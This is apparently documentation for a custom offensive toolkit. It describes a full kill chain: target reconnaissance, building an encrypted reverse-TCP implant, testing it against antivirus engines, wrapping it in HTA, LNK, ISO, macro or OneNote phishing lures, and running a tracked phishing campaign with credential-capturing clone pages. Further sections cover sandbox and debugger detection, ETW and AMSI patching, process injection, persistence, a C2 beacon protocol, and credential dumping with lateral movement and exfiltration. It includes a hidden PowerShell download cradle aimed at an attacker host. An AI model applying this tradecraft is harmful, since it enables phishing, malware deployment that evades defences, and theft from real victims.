# Kill Chain — Delivery to Compromise

How the five warrior tools chain together from reconnaissance through post-exploitation.

```
Lekir (recon) → Badang (build) → Tuah (test) → Kasturi (deliver) → Badang (execute) → Jebat (control)
  scout           strongman        warrior         lure              strongman          commander
```

---

## The Chain

```
┌─────────┐  targets   ┌─────────┐  binary   ┌─────────┐
│  LEKIR  │──────────►│ BADANG  │─────────►│  TUAH   │
│  recon  │  emails,   │ builder │  .exe     │ sandbox │
│         │  domains   │         │  .dll     │         │
└─────────┘            └─────────┘  .ps1     └────┬────┘
                                    .cs           │ clean?
                                                  │
                       ┌─────────┐  wrapped  ┌────▼────┐
                       │ KASTURI │◄──────────│ BADANG  │
                       │ phisher │  binary   │ builder │
                       └────┬────┘  in HTA/  └─────────┘
                            │       LNK/ISO
                   email    │       /macro
                   with     │
                   payload  │
                            ▼
                       ┌─────────┐           ┌─────────┐
                       │ TARGET  │  beacon   │  JEBAT  │
                       │ machine │──────────►│   C2    │
                       │ (Badang │◄──────────│ server  │
                       │ implant)│  tasks    │         │
                       └─────────┘           └─────────┘
```

---

## 1. Recon (Lekir)

Lekir maps the target's attack surface before anything else runs.

| Module | What it gathers |
|--------|----------------|
| Subdomain enum | DNS brute-force, cert transparency (crt.sh), zone transfer |
| Email harvest | Pattern guessing (first.last, flast), Hunter.io, LinkedIn, PGP keys |
| Tech fingerprint | HTTP headers, JS libraries, favicon hash, Wappalyzer-style rules |
| Port scan | TCP connect/SYN, banner grabbing, service version detection |
| Breach lookup | HaveIBeenPwned, DeHashed — check discovered emails |
| Cloud discovery | S3 buckets, Azure blobs, GCP storage — public access misconfig |

Output feeds into Kasturi (target email lists) and Jebat (infrastructure map).

---

## 2. Build the Implant (Badang — attacker side)

```bash
badang generate --payload reverse-tcp --host 10.0.0.5 --port 443
badang encrypt --method rc4 --key <hex>
badang package --format exe --output loader.exe
```

| Step | What happens |
|------|-------------|
| **Generate** | Produce shellcode — 6 payload types: exec, messagebox, reverse_tcp, bind_tcp, stager, nop |
| **Encrypt** | XOR or RC4 encrypt the shellcode with a key — decrypted at runtime only |
| **Package** | Wrap into output format — the binary that runs on target |

### Output formats

| Format | File | What it produces |
|--------|------|-----------------|
| Exe | `loader.exe` | Rust PE binary — loader + evasion + injection + comms all compiled in |
| Dll | `sideload.dll` | Rust DLL — same capabilities, loaded via DLL sideloading |
| Ps1 | `stager.ps1` | PowerShell script — downloads and executes the real payload in memory |
| CSharp | `dropper.cs` | C# source — compiles on target, loads payload via reflection |

The binary contains everything: loader checks, evasion patches, injection, persistence, beacon, and post-ex modules. No second-stage download needed (unless using a stager).

---

## 3. Test Before Delivery (Tuah — attacker side)

Before anything leaves your machine, Tuah runs it through a Docker sandbox with three AV engines.

```bash
tuah scan ./loader.exe            # single binary scan
tuah inspect ./output/            # classify + scan entire directory
tuah test ./loader.exe            # full chain: scan + execute + verify Jebat checkin
```

### Single binary scan

Mounts the binary into the sandbox container. ClamAV, YARA, and Windows Defender (mpengine.dll via loadlibrary) each scan it independently. Returns detected/clean per engine with threat names.

### Multi-binary inspect

Point at a directory of outputs and Tuah:

1. **Classifies each file** — extension + magic bytes (MZ/PE header, ISO 9660, HTML smuggling patterns)
2. **Mounts the entire directory** into one sandbox container
3. **Bulk-scans all files** with all three engines in a single pass
4. **Reports** kind, size, and per-engine detection for each

Supported types: PE EXE, PE DLL, Shellcode (.bin/.raw/.sc), PowerShell (.ps1), C# (.cs), HTA, VBScript, LNK, ISO, OneNote, HTML Smuggling, VBA Macros.

### Full chain test

Runs the binary under Wine, waits for it to beacon to Jebat, verifies the checkin, queues a shell task (`whoami`), confirms the result. If the scan passes but the checkin fails, the binary is broken. If the scan fails, the binary is detected — go back to step 2 and tweak evasion.

**If anything gets flagged → rebuild. Nothing leaves your machine until it's clean.**

---

## 4. Wrap in Delivery Format (Kasturi — attacker side)

The raw EXE can't be emailed directly — email gateways block executables. Kasturi wraps it in a social engineering format that gets past filters and tricks the target into running it.

| Format | Delivery | What happens on the target |
|--------|----------|---------------------------|
| **HTA** | Email link or attachment | Browser opens `.hta` → `mshta.exe` auto-runs embedded VBScript → downloads stager → executes |
| **LNK** | Email attachment | User double-clicks shortcut → hidden PowerShell one-liner → downloads from your server → executes in memory |
| **VBS** | Email attachment | `WScript.Shell.Run` → downloads and executes stager |
| **Macro** | `.docm` attachment | User enables macros → `Auto_Open` VBA → Shell download cradle → executes |
| **ISO** | Email link (too large to attach) | Windows auto-mounts `.iso` on double-click → user sees LNK inside → runs hidden payload |
| **HTML Smuggling** | Email link to hosted page | JavaScript constructs a Blob on the page → auto-triggers download → user runs the dropped file |
| **OneNote** | Email attachment | `.one` file with embedded payload behind "click to view" overlay → executes on click |

---

## 5. Send the Phishing Email (Kasturi — attacker side)

```
Campaign:  "IT Security Update"
Template:  "Hi {{first_name}}, please review the attached security update..."
Targets:   CSV import from Lekir recon (email, name, company, position)
Payload:   loader.hta attached (or link to hosted ISO / HTML smuggle page)
```

### Campaign engine

| Feature | How |
|---------|-----|
| Send modes | Immediate, scheduled, or drip (staggered over time) |
| SMTP | Direct send, relay via SendGrid/SES, or custom SMTP server |
| Domain rotation | Cycles through SPF/DKIM-verified sending domains to avoid blocklisting |
| Template variables | `{{first_name}}`, `{{last_name}}`, `{{company}}`, `{{tracking_url}}`, `{{payload_url}}` |

### Tracking

Each email gets unique tokens for:

| Event | Mechanism | Endpoint |
|-------|-----------|----------|
| **Opened** | 1x1 invisible tracking pixel | `GET /t/:token` → logs open, returns PNG |
| **Clicked** | Link wrapped through Kasturi redirect | `GET /r/:token` → logs click, redirects to real URL |
| **Downloaded** | Payload served with event logging | `GET /d/:token` → logs download, serves file |

Kasturi also hosts cloned login pages — `GET /c/:path` serves the page, `POST /c/:path` captures submitted credentials.

All events update in real-time via WebSocket to the operator dashboard.

---

## 6. Target Opens the Email

The target receives the email, opens it (pixel fires → "opened" event), clicks the link or opens the attachment. From here, control transfers to the target machine.

### Delivery format executes

**Example — HTA delivery:**
```
mshta.exe → VBScript → download loader.exe from attacker server → write to %TEMP% → execute
```

**Example — LNK delivery:**
```
shortcut.lnk → powershell -w hidden -c "IEX(iwr http://attacker/stager.ps1)"
             → stager downloads loader.exe → executes
```

**Example — ISO delivery:**
```
double-click .iso → Windows mounts as drive → user sees folder with LNK
                  → LNK runs hidden payload from same mounted drive
```

---

## 7. Loader Checks (Badang — target side)

Before doing anything offensive, the loader checks the environment. If it detects a sandbox, debugger, or VM — it exits silently. The analyst sees a clean binary that does nothing.

### Anti-sandbox (5 checks)

| Check | Technique | Trigger |
|-------|-----------|---------|
| Timing | Sleep 10s, measure elapsed | < 9s = sleep acceleration detected |
| Process count | Enumerate running processes | < 50 = sandbox (minimal OS) |
| Disk size | Query disk capacity | < 60GB = sandbox |
| Username | Check current username | Contains "sandbox", "malware", "virus", "test", "sample" |
| Memory | Query physical RAM | < 2GB = sandbox |

### Anti-debug (4 checks)

| Check | Technique | Trigger |
|-------|-----------|---------|
| PEB flag | `IsDebuggerPresent()` | Non-zero = debugger attached |
| Debug port | `NtQueryInformationProcess(ProcessDebugPort)` | Non-zero = debugger |
| Debug flags | `NtQueryInformationProcess(ProcessDebugFlags)` | Zero = debugger |
| Timing | Sleep 500ms, measure elapsed | > 1500ms = single-stepping |

### Anti-VM (3 checks)

| Check | Technique | Trigger |
|-------|-----------|---------|
| CPUID | Bit 31 of CPUID leaf 1 | Hypervisor present flag set |
| Registry | `HKLM\SOFTWARE\VMware`, `VirtualBox`, `Hyper-V` | Key exists |
| MAC prefix | First 3 bytes of MAC address | `00:0C:29` (VMware), `08:00:27` (VBox), `00:15:5D` (Hyper-V) |

**All checks pass → continue. Any check trips → exit(0).**

---

## 8. Evasion (Badang — target side)

With the environment verified clean, the binary disables security telemetry and prepares for injection.

| Technique | What it does | Why |
|-----------|-------------|-----|
| **ETW patch** | Patch `NtTraceEvent` to return early | No events reach EDR — blind spot |
| **AMSI bypass** | Patch `AmsiScanBuffer` to return clean | PowerShell/script content not scanned |
| **Indirect syscalls** | Hell's Gate / Halo's Gate — resolve SSN from ntdll, jump to ntdll gadget | Bypass userland API hooks — call kernel directly |
| **Sleep obfuscation** | Encrypt all memory regions during sleep intervals | Memory scanners see encrypted noise, not shellcode |
| **Stack spoofing** | Fake call frames on the stack | Stack traces look like legitimate API calls |
| **Dynamic API resolution** | Resolve 40+ APIs at runtime via `GetModuleHandleA` + `GetProcAddress` | Clean IAT — static analysis sees almost nothing |
| **String obfuscation** | 8-byte XOR on all strings at compile time, decrypt at runtime | No suspicious strings in the binary |

---

## 9. Injection + Persistence (Badang — target side)

### Injection (8 techniques)

The encrypted shellcode is injected into a legitimate process. The technique is chosen at build time.

| Technique | How |
|-----------|-----|
| **CreateRemoteThread** | Classic — `VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread` |
| **APC Queue** | Allocate + write → `QueueUserAPC` on target thread → runs on next alertable wait |
| **Thread Hijack** | Suspend thread → rewrite RIP/EIP to shellcode → resume |
| **Early Bird** | Create suspended process → inject before main thread starts → resume |
| **Section Map** | Create shared section → map into target → write shellcode → trigger execution |
| **Callback** | Write shellcode → trigger via `EnumWindows` / `CreateTimerQueueTimer` callback |
| **Module Stomping** | Load a legitimate DLL → overwrite its `.text` section with shellcode |
| **Process Hollowing** | Create suspended process → unmap original image → map shellcode → resume |

### Persistence (6 methods)

Survives reboot. Established after successful injection.

| Method | Location |
|--------|----------|
| **Registry** | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
| **Scheduled task** | `schtasks /create` with SYSTEM privileges |
| **WMI event** | Permanent event subscription — triggers on boot |
| **DLL hijack** | Drop DLL in a directory a legitimate app loads from |
| **COM hijack** | Register as COM object — loaded by legitimate software |
| **Service** | Create a Windows service with auto-start |

---

## 10. Beacon Loop (Badang → Jebat)

With injection complete and persistence set, the beacon starts.

```
loop {
    sleep(interval ± jitter)

    POST /beacon
    → RC4-encrypted checkin: agent_id (16B), hostname, OS, username, IP

    ← RC4-encrypted task list: [task_type, data_len, data] × N

    execute each task

    POST /result
    → RC4-encrypted result: agent_id, task_type, success, output
}
```

### Channels

| Channel | Transport | Use case |
|---------|-----------|----------|
| **HTTPS** | TLS POST/GET to configured path, RC4 inner layer | Default — blends with normal web traffic |
| **DNS** | TXT record exfil, hex-encoded RC4 payload | Restricted networks — DNS usually allowed |
| **SMB** | Named pipe, length-prefixed framing | Internal pivot — lateral movement between hosts |

### Wire protocol

```
Checkin (0x01):  [16B agent_id][payload: hostname, OS, user, IP as null-terminated strings]
Task List (0x02): [4B count][for each: [1B task_type][4B data_len][data]]
Result (0x03):   [16B agent_id][1B task_type][1B success][4B data_len][data]
```

All messages RC4-encrypted with a shared key configured at build time (Badang) and runtime (Jebat).

---

## 11. Operator Takes Control (Jebat — attacker side)

Jebat receives the checkin and the implant appears in the web UI / CLI. The operator now has full control.

### Task types

| Type | Task | What it does |
|------|------|-------------|
| 0 | Nop | Heartbeat — no action |
| 1 | Shell | `cmd.exe /c <command>` with pipe capture |
| 2 | SleepChange | Adjust beacon interval + jitter |
| 3 | Exit | Kill the implant |
| 4 | FileUpload | Transfer file from operator → implant |
| 5 | FileDownload | Transfer file from implant → operator |
| 6 | CredDump | LSASS dump, SAM/SYSTEM export, or token delegation |
| 7 | LateralMove | PsExec, WMI, or WinRM to another host |
| 8 | Exfil | Staged file extraction — 64KB chunks, RC4 encrypted |
| 9 | SocksConnect | Start SOCKS5 proxy through the implant |
| 10 | PortForward | Port relay through the implant |

### Post-exploitation detail

| Module | Technique |
|--------|-----------|
| **LSASS dump** | `SeDebugPrivilege` → `OpenProcess` → `MiniDumpWriteDump` |
| **SAM export** | `reg.exe save HKLM\SAM` + `HKLM\SYSTEM` |
| **Token delegation** | `OpenProcessToken` → `DuplicateTokenEx` → `ImpersonateLoggedOnUser` |
| **PsExec** | `WNetAddConnection2A` → `CopyFileA` → `CreateServiceA` → `StartServiceA` |
| **WMI exec** | `wmic /node:target process call create` |
| **WinRM exec** | `winrs -r:target command` |
| **Exfil** | `CreateFileA` → `GetFileSize` → read 64KB chunks → RC4 encrypt → socket send |
| **SOCKS5** | `bind` → `listen` → `accept` → SOCKS5 handshake → `select()` relay |
| **Port forward** | `bind` → `listen` → `accept` → connect remote → `select()` relay |

---

## Quick Reference

| # | Tool | Named After | Role | Runs On | Chain Step |
|---|------|-------------|------|---------|------------|
| 1 | **Lekir** | The scout | Recon — map attack surface | Attacker | 1. Recon |
| 2 | **Badang** | The strongman | Build implant + run on target | Attacker (build) + Target (run) | 2. Build, 7-11. Execute |
| 3 | **Tuah** | The greatest warrior | Test binaries before delivery | Attacker (Docker) | 3. Test |
| 4 | **Kasturi** | Musk — the lure | Phishing — wrap, send, track | Attacker | 4-5. Deliver |
| 5 | **Jebat** | The commander | C2 — control implants | Attacker | 11. Control |

---

*All tools are for authorized security research and red team operations only.*
